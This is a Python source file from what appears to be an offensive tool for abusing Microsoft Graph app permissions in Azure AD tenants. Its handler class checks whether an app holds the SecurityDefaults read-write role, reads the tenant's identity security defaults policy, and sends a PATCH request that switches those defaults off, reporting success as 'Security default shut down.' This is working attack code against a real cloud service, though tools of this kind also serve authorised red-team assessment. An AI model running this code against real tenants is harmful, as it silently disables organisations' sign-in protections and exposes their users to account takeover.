from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.sec_defaults_handler')


class SecDefaults_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if ("Policy.ReadWrite.SecurityDefaults" in request.roles) and ("Policy.Read.All" in request.roles):
            logger.info('tid: %s, appid: %s may be vulnerable to security_defaults vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "SecurityDefaultsVectors"
            message = ""
            error = "SecurityDefaultsVectors - failed"
            logger.debug("Policy.ReadWrite.SecurityDefaults - Allows the app to read and write your organization's security defaults policy, without a signed-in user.")
            logger.debug("Policy.Read.All - Allows the app to read all your organization's policies without a signed in user.")
            logger.debug("Attack vector - security settings shut down.") 
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy"

                result = requests.get(create_message_URL, headers=request.request_headers)
                json = result.json()

                if json["isEnabled"]:
                    create_message_URL = "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy"
                    message_obj = {
                        "isEnabled": False
                    }
                    result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                    json = result.json()

                    if not json["isEnabled"]:
                        message += "Security default shut  down.\n"
                        status = True
                        
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in SecurityDefaults_Handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
          
